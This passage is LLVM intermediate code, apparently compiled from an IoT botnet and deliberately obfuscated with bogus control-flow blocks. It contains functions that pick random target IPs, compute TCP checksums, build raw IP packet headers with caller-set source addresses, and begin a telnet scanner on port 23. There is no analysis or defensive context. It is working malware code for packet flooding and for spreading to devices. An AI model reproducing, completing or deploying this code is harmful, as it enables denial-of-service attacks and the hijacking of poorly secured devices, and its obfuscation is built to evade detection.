  %2638 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2639 = zext i8 %2638 to i32
  %2640 = call i32 (i8*, i8*, ...) @szprintf(i8* %2635, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.278, i32 0, i32 0), i32 %2637, i32 %2639)
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1967
  %2641 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2642 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2643 = zext i8 %2642 to i32
  %2644 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2645 = zext i8 %2644 to i32
  %2646 = call i32 (i8*, i8*, ...) @szprintf(i8* %2641, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.279, i32 0, i32 0), i32 %2643, i32 %2645)
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1990
  %2647 = load i32, i32* %1, align 4
  %2648 = icmp eq i32 %2647, 95
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %2019
  %2649 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2650 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2651 = zext i8 %2650 to i32
  %2652 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2653 = zext i8 %2652 to i32
  %2654 = call i32 (i8*, i8*, ...) @szprintf(i8* %2649, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.281, i32 0, i32 0), i32 %2651, i32 %2653)
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %2042
  %2655 = load i32, i32* %1, align 4
  %2656 = icmp eq i32 %2655, 97
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %2071
  %2657 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2658 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2659 = zext i8 %2658 to i32
  %2660 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2661 = zext i8 %2660 to i32
  %2662 = call i32 (i8*, i8*, ...) @szprintf(i8* %2657, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.283, i32 0, i32 0), i32 %2659, i32 %2661)
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %2157
  %2663 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2664 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2665 = zext i8 %2664 to i32
  %2666 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2667 = zext i8 %2666 to i32
  %2668 = call i32 (i8*, i8*, ...) @szprintf(i8* %2663, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.290, i32 0, i32 0), i32 %2665, i32 %2667)
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %2183
  %2669 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2670 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2671 = zext i8 %2670 to i32
  %2672 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2673 = zext i8 %2672 to i32
  %2674 = call i32 (i8*, i8*, ...) @szprintf(i8* %2669, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.291, i32 0, i32 0), i32 %2671, i32 %2673)
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2236
  %2675 = load i32, i32* %1, align 4
  %2676 = icmp eq i32 %2675, 110
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2262
  %2677 = load i32, i32* %1, align 4
  %2678 = icmp eq i32 %2677, 111
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2301
  %2679 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2680 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2681 = zext i8 %2680 to i32
  %2682 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2683 = zext i8 %2682 to i32
  %2684 = call i32 (i8*, i8*, ...) @szprintf(i8* %2679, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.298, i32 0, i32 0), i32 %2681, i32 %2683)
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2364
  %2685 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2686 = call i32 @inet_addr(i8* %2685) #5
  br label %originalBB290
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %originalBBpart215, %2
  %7 = load i32, i32* @x.81
  %8 = load i32, i32* @y.82
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %4, align 4
  %16 = icmp sgt i32 %15, 1
  %17 = load i32, i32* @x.81
  %18 = load i32, i32* @y.82
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %16, label %25, label %50

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i32, i32* @x.81
  %27 = load i32, i32* @y.82
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i16*, i16** %3, align 8
  %35 = getelementptr inbounds i16, i16* %34, i32 1
  store i16* %35, i16** %3, align 8
  %36 = load i16, i16* %34, align 2
  %37 = zext i16 %36 to i64
  %38 = load i64, i64* %5, align 8
  %39 = add i64 %38, %37
  store i64 %39, i64* %5, align 8
  %40 = load i32, i32* %4, align 4
  %41 = sub nsw i32 %40, 2
  store i32 %41, i32* %4, align 4
  %42 = load i32, i32* @x.81
  %43 = load i32, i32* @y.82
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %6

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* %4, align 4
  %52 = icmp sgt i32 %51, 0
  br i1 %52, label %53, label %76

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @x.81
  %55 = load i32, i32* @y.82
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %53
  %62 = load i16*, i16** %3, align 8
  %63 = bitcast i16* %62 to i8*
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i64
  %66 = load i64, i64* %5, align 8
  %67 = add i64 %66, %65
  store i64 %67, i64* %5, align 8
  %68 = load i32, i32* @x.81
  %69 = load i32, i32* @y.82
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart223, label %originalBB17alteredBB

originalBBpart223:                                ; preds = %originalBB17
  br label %76

; <label>:76:                                     ; preds = %originalBBpart223, %50
  br label %77

; <label>:77:                                     ; preds = %81, %76
  %78 = load i64, i64* %5, align 8
  %79 = lshr i64 %78, 16
  %80 = icmp ne i64 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i64, i64* %5, align 8
  %83 = and i64 %82, 65535
  %84 = load i64, i64* %5, align 8
  %85 = lshr i64 %84, 16
  %86 = add i64 %83, %85
  store i64 %86, i64* %5, align 8
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i64, i64* %5, align 8
  %89 = xor i64 %88, -1
  %90 = trunc i64 %89 to i16
  ret i16 %90

originalBBalteredBB:                              ; preds = %originalBB, %6
  %91 = load i32, i32* %4, align 4
  %92 = icmp sgt i32 %91, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %93 = load i16*, i16** %3, align 8
  %94 = getelementptr inbounds i16, i16* %93, i32 1
  store i16* %94, i16** %3, align 8
  %95 = load i16, i16* %93, align 2
  %96 = zext i16 %95 to i64
  %97 = load i64, i64* %5, align 8
  %_ = sub i64 %97, %96
  %gen = mul i64 %_, %96
  %_2 = sub i64 0, %97
  %gen3 = add i64 %_2, %96
  %_4 = sub i64 %97, %96
  %gen5 = mul i64 %_4, %96
  %98 = add i64 %97, %96
  store i64 %98, i64* %5, align 8
  %99 = load i32, i32* %4, align 4
  %_6 = sub i32 %99, 2
  %gen7 = mul i32 %_6, 2
  %_8 = sub i32 %99, 2
  %gen9 = mul i32 %_8, 2
  %_10 = shl i32 %99, 2
  %_11 = sub i32 %99, 2
  %gen12 = mul i32 %_11, 2
  %_13 = shl i32 %99, 2
  %100 = sub nsw i32 %99, 2
  store i32 %100, i32* %4, align 4
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %53
  %101 = load i16*, i16** %3, align 8
  %102 = bitcast i16* %101 to i8*
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i64
  %105 = load i64, i64* %5, align 8
  %_18 = sub i64 0, %105
  %gen19 = add i64 %_18, %104
  %_20 = shl i64 %105, %104
  %_21 = shl i64 %105, %104
  %106 = add i64 %105, %104
  store i64 %106, i64* %5, align 8
  br label %originalBB17
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.83
  %4 = load i32, i32* @y.84
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #13
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #5
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #5
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.83
  %54 = load i32, i32* @y.84
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #13
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #5
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #5
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.85
  %7 = load i32, i32* @y.86
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.85
  %57 = load i32, i32* @y.86
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = shl i8 %71, -16
  %_1 = shl i8 %71, -16
  %72 = and i8 %71, -16
  %_2 = shl i8 %72, 5
  %_3 = sub i8 %72, 5
  %gen = mul i8 %_3, 5
  %_4 = sub i8 %72, 5
  %gen5 = mul i8 %_4, 5
  %_6 = sub i8 0, %72
  %gen7 = add i8 %_6, 5
  %_8 = shl i8 %72, 5
  %_9 = sub i8 0, %72
  %gen10 = add i8 %_9, 5
  %_11 = shl i8 %72, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_12 = sub i8 %76, 15
  %gen13 = mul i8 %_12, 15
  %_14 = shl i8 %76, 15
  %_15 = sub i8 0, %76
  %gen16 = add i8 %_15, 15
  %_17 = sub i8 0, %76
  %gen18 = add i8 %_17, 15
  %_19 = sub i8 %76, 15
  %gen20 = mul i8 %_19, 15
  %77 = and i8 %76, 15
  %_21 = shl i8 %77, 64
  %_22 = shl i8 %77, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_23 = sub i64 0, 20
  %gen24 = add i64 %_23, %82
  %_25 = sub i64 0, 20
  %gen26 = add i64 %_25, %82
  %_27 = shl i64 20, %82
  %_28 = sub i64 20, %82
  %gen29 = mul i64 %_28, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = load i32, i32* @x.87
  %3 = load i32, i32* @y.88
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  %12 = load i32, i32* %11, align 4
  %13 = icmp sgt i32 3, %12
  %14 = load i32, i32* @x.87
  %15 = load i32, i32* @y.88
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %23

; <label>:22:                                     ; preds = %originalBBpart2
  store i32 1, i32* %10, align 4
  br label %26

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* %11, align 4
  %25 = call i32 @close(i32 %24)
  store i32 0, i32* %10, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %22
  %27 = load i32, i32* %10, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i32 %0, i32* %29, align 4
  %30 = load i32, i32* %29, align 4
  %31 = icmp sgt i32 3, %30
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @PhoneScanner() #0 {
  %1 = load i32, i32* @x.89
  %2 = load i32, i32* @y.90
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [128 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca %struct.__sigset_t, align 8
  %18 = alloca %struct.timeval, align 8
  %19 = alloca i32, align 4
  %20 = alloca [256 x i8], align 16
  %21 = alloca i8*, align 8
  %22 = alloca %struct.sockaddr_in, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i32 512, i32* %9, align 4
  %27 = load i32, i32* %9, align 4
  store i32 %27, i32* %14, align 4
  %28 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %29 = call i32 @rand_cmwc()
  %30 = xor i32 %28, %29
  call void @srand(i32 %30) #5
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 0
  store i16 2, i16* %31, align 4
  %32 = call zeroext i16 @htons(i16 zeroext 23) #13
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 1
  store i16 %32, i16* %33, align 2
